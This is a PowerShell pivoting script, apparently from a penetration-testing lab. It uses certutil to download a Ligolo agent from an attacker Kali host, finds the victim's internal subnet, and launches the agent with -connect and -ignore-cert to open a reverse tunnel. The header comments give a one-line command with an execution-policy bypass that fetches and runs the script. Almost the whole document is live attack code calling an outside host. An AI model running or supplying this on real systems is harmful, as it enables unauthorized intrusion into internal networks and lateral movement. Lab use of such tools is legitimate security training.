#Powershell script to download and run LIGOLO
#Be sure to turn on Kali Ligolo first & also start python server before downloading this script
#In a powershell terminal, download this script and run by running this command:
#replace KALI_IPADDRESS As NECESSARY:
#************************************************
#mkdir C:/tmp; certutil -urlcache -f http://$KALIIP_Address/ligolo.ps1 C:/tmp/ligolo.ps1; C:/tmp/ligolo.ps1
#************************************************
#Sample below: Copy & Run in the terminal before running this script.
#------------------------------------------------------------------------
#powershell -ep bypass
#1. (=======================LOOK HERE AND REPLACE!!!!!!!!!!!!!!!!!!!=======================)
#mkdir C:/tmp; certutil -urlcache -f http://192.168.45.220/dwnligolo.ps1 C:/tmp/dwnligolo.ps1; C:/tmp/dwnligolo.ps1
#------------------------------------------------------------------------

#START OF SCRIPT#

#replace below ipaddress with your new IPADDRESS:
Write-Host "Downloading ligolo agent..."

#2. (=======================LOOK HERE AND REPLACE!!!!!!!!!!!!!!!!!!!=======================)
#certutil -urlcache -f KALIIP_Address/agent.exe C:/tmp/agent.exe
certutil -urlcache -f http://192.168.45.220/agent.exe C:/tmp/agent.exe

# Output a message
Write-Host "Done! Lets wait a while for 2 seconds!"
Write-Host " "

# Sleep for 2 seconds
Start-Sleep -Seconds 2

# Optional: Confirm the sleep is done

Write-Host " "
Write-Host " "
Write-Host "ipconfig"
ipconfig
Write-Host "Lets check your IP first so you can add this to your route"
Write-Host " "
Write-Host " "
Write-Host "Make sure you start the session on ligolo"
Write-Host "Session"
Write-Host "1"
Write-Host "Start"
Write-Host " "
Write-Host " "

# Use ipconfig to retrieve the adapter information and extract IPs
$IPAddress = ipconfig | ForEach-Object {
    if ($_ -match "IPv4 Address.*:\s*(172\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+)") {
        $matches[1] -replace "\.\d+$", ".0"
    }
}
# Check if an IP address was found and assign it to the route command
if ($IPAddress) {
    Write-Host "Copy Command Below and open a new tab and run on KALI!"
    $Command = "sudo ip route add $IPAddress/24 dev ligolo"
    Write-Host $Command
} else {
    Write-Host "No matching IP address found."
}
Write-Host " "
Write-Host " "


Write-Host "Turning on Ligolo Now! Make sure your ligolo has already started in Kali!"

#3. (=======================LOOK HERE AND REPLACE!!!!!!!!!!!!!!!!!!!=======================)
#Be sure to replace $KALIIP_Address with the actual IPADDRESS
#C:/tmp/agent.exe -connect $KALIIP_Address:11601 -ignore-cert

C:/tmp/agent.exe -connect 192.168.45.220:11601 -ignore-cert
